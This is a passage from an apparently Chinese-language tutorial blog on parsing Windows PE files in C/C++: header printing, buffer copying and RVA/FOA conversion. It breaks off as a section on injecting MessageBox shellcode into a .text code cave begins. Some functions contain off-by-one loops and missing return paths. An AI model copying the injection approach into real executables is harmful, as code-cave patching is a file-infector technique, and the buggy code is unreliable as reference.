<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_END);       <span class="comment">//int fseek（FILE *fp，long offset，int fromwhere）；</span></span><br><span class="line">	fileSize = <span class="built_in">ftell</span>(pFile);         <span class="comment">//将fp的文件位置指针从fromwhere开始移动offset个字节指示下一个要读取的数据的位置</span></span><br><span class="line">	<span class="built_in">fseek</span>(pFile, <span class="number">0</span>, SEEK_SET);       <span class="comment">//SEEK_SET或0，代表文件开始处；SEEK_CUR或1，代表文件当前位置；SEEK_END或2，代表文件结尾处。</span></span><br><span class="line">	<span class="comment">//关闭文件	</span></span><br><span class="line">	<span class="built_in">fclose</span>(pFile);	</span><br><span class="line">	<span class="keyword">return</span> fileSize;		</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>

<h2 id="3-PrintNTHeaders"><a href="#3-PrintNTHeaders" class="headerlink" title="3 PrintNTHeaders"></a>3 PrintNTHeaders</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*****************************************************************************</span></span><br><span class="line"><span class="comment">打印PE文件头部信息</span></span><br><span class="line"><span class="comment">*****************************************************************************/</span>		</span><br><span class="line"><span class="function">VOID <span class="title">PrintNTHeaders</span><span class="params">()</span>		</span></span><br><span class="line"><span class="function"></span>&#123;		</span><br><span class="line">	LPVOID pFileBuffer = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pPEHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PDWORD FILESIZE_1 = <span class="literal">NULL</span>;</span><br><span class="line">		</span><br><span class="line">	pFileBuffer = ReadPEFile(FILEPATH);	</span><br><span class="line">	<span class="keyword">if</span>(!pFileBuffer)	</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;文件读取失败\n&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> ; </span><br><span class="line">		&#125;	</span><br><span class="line">		</span><br><span class="line">	<span class="comment">//判断是否是有效的MZ标志	</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)	</span><br><span class="line">		&#123;	</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;不是有效的MZ标志\n&quot;</span>);</span><br><span class="line">			<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">			<span class="keyword">return</span> ; </span><br><span class="line">		&#125;	</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;	</span><br><span class="line">	<span class="comment">//打印DOS头	</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************DOS头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;MZ标志：%x\n&quot;</span>,pDosHeader-&gt;e_magic);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PE偏移：%x\n&quot;</span>,pDosHeader-&gt;e_lfanew);	</span><br><span class="line">	<span class="comment">//判断是否是有效的PE标志	</span></span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((DWORD)pFileBuffer+pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)	</span><br><span class="line">	&#123;	</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;不是有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="built_in">free</span>(pFileBuffer);</span><br><span class="line">		<span class="keyword">return</span> ;</span><br><span class="line">	&#125;	</span><br><span class="line">	<span class="comment">//(DWORD)pFileBuffer---将pFileBuffer指向的地址转化为DWORD型</span></span><br><span class="line">	<span class="comment">//两种修改方式：可以将指针的地址转换成BYTE *型（加数字的时候加的大小为去掉一个*后的类型大小）</span></span><br><span class="line">	<span class="comment">//或者转换成数字DWORD</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pFileBuffer+pDosHeader-&gt;e_lfanew);	   </span><br><span class="line">	<span class="comment">//打印NT头																												</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************NT头********************\n&quot;</span>);											</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;NT签名：%x\n&quot;</span>,pNTHeader-&gt;Signature);	</span><br><span class="line">	pPEHeader = (PIMAGE_FILE_HEADER)(((BYTE *)pNTHeader) + <span class="number">4</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************PE头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;PE-Machine：%x\n&quot;</span>,pPEHeader-&gt;Machine);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;节的数量：%x\n&quot;</span>,pPEHeader-&gt;NumberOfSections);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;SizeOfOptionalHeader：%x\n&quot;</span>,pPEHeader-&gt;SizeOfOptionalHeader);	</span><br><span class="line">	<span class="comment">//可选PE头	</span></span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER32)((BYTE *)pPEHeader+IMAGE_SIZEOF_FILE_HEADER);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************OPTIOIN_PE头********************\n&quot;</span>);	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;OPTION_PE-Magic：%x\n&quot;</span>,pOptionHeader-&gt;Magic);	</span><br><span class="line"></span><br><span class="line">	pSectionHeader=(PIMAGE_SECTION_HEADER)((DWORD)pOptionHeader+pPEHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;********************节表********************\n&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;pPEHeader-&gt;NumberOfSections;i++)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Name：%s\n&quot;</span>,pSectionHeader-&gt;Name);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Misc：%x\n&quot;</span>,pSectionHeader-&gt;Misc);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;VirtualAddress：%x\n&quot;</span>,pSectionHeader-&gt;VirtualAddress);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;SizeOfRawData：%x\n&quot;</span>,pSectionHeader-&gt;SizeOfRawData);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;PointerToRawData：%x\n&quot;</span>,pSectionHeader-&gt;PointerToRawData);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Characteristics：%x\n&quot;</span>,pSectionHeader-&gt;Characteristics);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                pSectionHeader+=<span class="number">0x1</span>;<span class="comment">//这里应该加什么？</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,pSectionHeader);</span></span><br><span class="line">		<span class="comment">//printf(&quot;%x\n&quot;,pSectionHeader+1);</span></span><br><span class="line">	<span class="comment">//释放内存	</span></span><br><span class="line">	<span class="built_in">free</span>(pFileBuffer);	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="4-CopyFileBufferToImageBuffer"><a href="#4-CopyFileBufferToImageBuffer" class="headerlink" title="4 CopyFileBufferToImageBuffer"></a>4 CopyFileBufferToImageBuffer</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************					将文件从FileBuffer复制到ImageBuffer							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pFileBuffer  FileBuffer指针							</span></span><br><span class="line"><span class="comment">pImageBuffer ImageBuffer指针							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小	</span></span><br><span class="line"><span class="comment">IN OUT仅做标志用，原型：#define IN，#define IN</span></span><br><span class="line"><span class="comment">**************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">CopyFileBufferToImageBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pFileBuffer,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPVOID *pImageBuffer</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	LPVOID pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pFileBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pFileBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pFileBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pFileBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pFileBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//根据SizeOfImage申请空间哦</span></span><br><span class="line">	pTempFileBuffer = <span class="built_in">malloc</span>(pOptionHeader-&gt;SizeOfImage);</span><br><span class="line">	<span class="keyword">if</span>(!pTempFileBuffer)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pTempFileBuffer空间申请失败...&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">memset</span>(pTempFileBuffer, <span class="number">0</span>, pOptionHeader-&gt;SizeOfImage);</span><br><span class="line">	<span class="built_in">memcpy</span>(pTempFileBuffer, pDosHeader, pOptionHeader-&gt;SizeOfHeaders);</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)&#123;</span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)((BYTE *)pTempFileBuffer + (pSectionHeader + i)-&gt;VirtualAddress), (PVOID)((BYTE *)pDosHeader + (pSectionHeader + i)-&gt;PointerToRawData), (pSectionHeader + i)-&gt;SizeOfRawData);</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	*pImageBuffer = pTempFileBuffer;</span><br><span class="line">	pTempFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> pOptionHeader-&gt;SizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="5-CopyImageBufferToNewFileBuffer"><a href="#5-CopyImageBufferToNewFileBuffer" class="headerlink" title="5 CopyImageBufferToNewFileBuffer"></a>5 CopyImageBufferToNewFileBuffer</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************					</span></span><br><span class="line"><span class="comment">将ImageBuffer中的数据复制到新的缓冲区							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pImageBuffer ImageBuffer指针							</span></span><br><span class="line"><span class="comment">pNewBuffer NewBuffer指针							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小							</span></span><br><span class="line"><span class="comment">**************************************************************************/</span>							</span><br><span class="line"><span class="function">DWORD <span class="title">CopyImageBufferToNewFileBuffer</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pImageBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPVOID *pNewFileBuffer</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line">	<span class="keyword">for</span>(DWORD i = <span class="number">0</span>; i &lt; pFileHeader-&gt;NumberOfSections; i++)&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;pSectionHeader-&gt;Name = &quot;</span> &lt;&lt; (pSectionHeader + i)-&gt;Name &lt;&lt; endl;</span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)((BYTE *)pDosHeader + (pSectionHeader + i)-&gt;PointerToRawData), (PVOID)((BYTE *)pImageBuffer + (pSectionHeader + i)-&gt;VirtualAddress), (pSectionHeader + i)-&gt;SizeOfRawData);</span><br><span class="line">	&#125;</span><br><span class="line">	*pNewFileBuffer = pImageBuffer;</span><br><span class="line">	pImageBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">return</span> pOptionHeader-&gt;SizeOfImage;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="6-NewFileBufferToFile"><a href="#6-NewFileBufferToFile" class="headerlink" title="6 NewFileBufferToFile"></a>6 NewFileBufferToFile</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************</span></span><br><span class="line"><span class="comment">将内存中的数据复制到文件							</span></span><br><span class="line"><span class="comment">参数说明：							</span></span><br><span class="line"><span class="comment">pNewFileBuffer 内存中数据的指针							</span></span><br><span class="line"><span class="comment">size 要复制的大小							</span></span><br><span class="line"><span class="comment">lpszFile 要存储的文件路径							</span></span><br><span class="line"><span class="comment">返回值说明：							</span></span><br><span class="line"><span class="comment">读取失败返回0  否则返回复制的大小							</span></span><br><span class="line"><span class="comment">**************************************************************************/</span>	</span><br><span class="line"><span class="function">BOOL <span class="title">NewFileBufferToFile</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">	IN LPVOID pNewFileBuffer, </span></span></span><br><span class="line"><span class="function"><span class="params">	<span class="keyword">size_t</span> size,</span></span></span><br><span class="line"><span class="function"><span class="params">	OUT LPSTR lpszFile</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(pNewFileBuffer == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pNewFileBuffer缓冲区出差...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	FILE *pFile = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">size_t</span> fileSize = size;</span><br><span class="line">	pFile = fopen(lpszFile, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!pFile)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fopen保存EXE文件失败...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">size_t</span> n = fwrite(pNewFileBuffer, fileSize, <span class="number">1</span>, pFile);</span><br><span class="line">	<span class="keyword">if</span>(!n)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fwrite数据写入失败...\n&quot;</span>);</span><br><span class="line">		fclose(pFile);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	fclose(pFile);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;存盘成功\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="7-RVAToFOA"><a href="#7-RVAToFOA" class="headerlink" title="7 RVAToFOA"></a>7 RVAToFOA</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************	</span></span><br><span class="line"><span class="comment">编写一个函数，能够将VA的值转换成FOA</span></span><br><span class="line"><span class="comment">	先定位该RVA在哪一个节</span></span><br><span class="line"><span class="comment">	VA = FOA  - PointerToRawData + VirtualAddress + ImageBase</span></span><br><span class="line"><span class="comment">	RVA = VA - ImageBase</span></span><br><span class="line"><span class="comment">	FOA = VA - ImageBase - VirtualAddress + PointerToRawData</span></span><br><span class="line"><span class="comment">参数：需要转换的RVA，该文件的FileBuffer</span></span><br><span class="line"><span class="comment">**************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">RVAToFOA</span><span class="params">(DWORD RVA,PVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化PE头部结构体</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	DWORD VA = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> 	</span><br><span class="line"> 	VA = RVA + pOptionHeader-&gt;ImageBase;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=pFileHeader-&gt;NumberOfSections; i++) </span><br><span class="line">	&#123;          </span><br><span class="line">		<span class="keyword">if</span> (RVA &gt;= (pSectionHeader-&gt;VirtualAddress) &amp;&amp; RVA &lt; (pSectionHeader-&gt;VirtualAddress + pSectionHeader-&gt;Misc.VirtualSize)) </span><br><span class="line">		&#123; 	   </span><br><span class="line">			<span class="keyword">return</span> (RVA - pSectionHeader-&gt;VirtualAddress) + pSectionHeader-&gt;PointerToRawData; </span><br><span class="line">		&#125; </span><br><span class="line">		pSectionHeader++; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="8-FOAToRVA"><a href="#8-FOAToRVA" class="headerlink" title="8 FOAToRVA"></a>8 FOAToRVA</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/***************************************************************************	</span></span><br><span class="line"><span class="comment">编写一个函数，能够将FOA的值转换成RVA</span></span><br><span class="line"><span class="comment">	先定位该FOA在哪一个节</span></span><br><span class="line"><span class="comment">	RVA = FOA - PointerToRawData + VirtualAddress</span></span><br><span class="line"><span class="comment">	VA = FOA  - PointerToRawData + VirtualAddress + ImageBase</span></span><br><span class="line"><span class="comment">	RVA = VA - ImageBase</span></span><br><span class="line"><span class="comment">	FOA = VA - ImageBase - VirtualAddress + PointerToRawData</span></span><br><span class="line"><span class="comment">参数：需要转换的FOA，该文件的FileBuffer</span></span><br><span class="line"><span class="comment">***************************************************************************/</span></span><br><span class="line"><span class="function">DWORD <span class="title">FOAToRVA</span><span class="params">(DWORD FOA,PVOID pImageBuffer)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 初始化PE头部结构体</span></span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;	</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER32 pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER pSectionHeader = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pImageBuffer ==<span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;pImageBuffer缓冲区指针出错...\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="comment">//判断是否含有有效MZ和PE标志</span></span><br><span class="line">	<span class="keyword">if</span>(*((PWORD)pImageBuffer) != IMAGE_DOS_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的MZ标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	pDosHeader = (PIMAGE_DOS_HEADER)pImageBuffer;</span><br><span class="line">	<span class="keyword">if</span>(*((PDWORD)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew)) != IMAGE_NT_SIGNATURE)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;无有效的PE标志\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ERROR;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//找到所有PE文件结构的头地址</span></span><br><span class="line">	pNTHeader = (PIMAGE_NT_HEADERS)((BYTE *)pImageBuffer + pDosHeader-&gt;e_lfanew);</span><br><span class="line">	pFileHeader = (PIMAGE_FILE_HEADER)((BYTE *)pNTHeader + <span class="built_in"><span class="keyword">sizeof</span></span>(DWORD));</span><br><span class="line">	pOptionHeader = (PIMAGE_OPTIONAL_HEADER)((BYTE *)pFileHeader + IMAGE_SIZEOF_FILE_HEADER);</span><br><span class="line">	pSectionHeader = (PIMAGE_SECTION_HEADER)((BYTE *)pOptionHeader + pFileHeader-&gt;SizeOfOptionalHeader);</span><br><span class="line"> 	</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;=pFileHeader-&gt;NumberOfSections; i++) </span><br><span class="line">	&#123;          </span><br><span class="line">		<span class="keyword">if</span> (FOA &gt;= (pSectionHeader-&gt;PointerToRawData) &amp;&amp; FOA &lt; (pSectionHeader-&gt;PointerToRawData + pSectionHeader-&gt;SizeOfRawData)) </span><br><span class="line">		&#123; 	   </span><br><span class="line">			<span class="keyword">return</span> FOA - pSectionHeader-&gt;PointerToRawData + pSectionHeader-&gt;VirtualAddress; </span><br><span class="line">		&#125; </span><br><span class="line">		pSectionHeader++; </span><br><span class="line">	&#125; </span><br><span class="line">	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="9-AddCodeToTextSec"><a href="#9-AddCodeToTextSec" class="headerlink" title="9 AddCodeToTextSec"></a>9 AddCodeToTextSec</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**************************************************************************	</span></span><br><span class="line"><span class="comment">AddCodeToTextSec：在代码（.text）空白区添加代码（修改PE文件），然后实现shellcode弹窗MessageBox</span></span><br><span class="line"><span class="comment">程序先执行call MessageBox（E8 0x75357870），执行完之后jmp OEP（E9 OEP）</span></span><br><span class="line"><span class="comment">call（E8）跳转的地址为(DWORD)((DWORD)codeBegin + 0xD)</span></span><br><span class="line"><span class="comment">但是pImageBuffer是动态生成的，下一次调用函数重新申请时值会改变，需要使用pOptionHeader-&gt;ImageBase才准确</span></span><br><span class="line"><span class="comment">***************************************************************************/</span>	</span><br><span class="line"><span class="function">VOID <span class="title">AddCodeToTextSec</span><span class="params">(LPVOID pFileBuffer,LPVOID pImageBuffer)</span></span>&#123;</span><br><span class="line">	LPVOID pNewFileBuffer = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_DOS_HEADER pDosHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_NT_HEADERS pNTHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_FILE_HEADER pFileHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_OPTIONAL_HEADER pOptionHeader = <span class="literal">NULL</span>;</span><br><span class="line">	PIMAGE_SECTION_HEADER 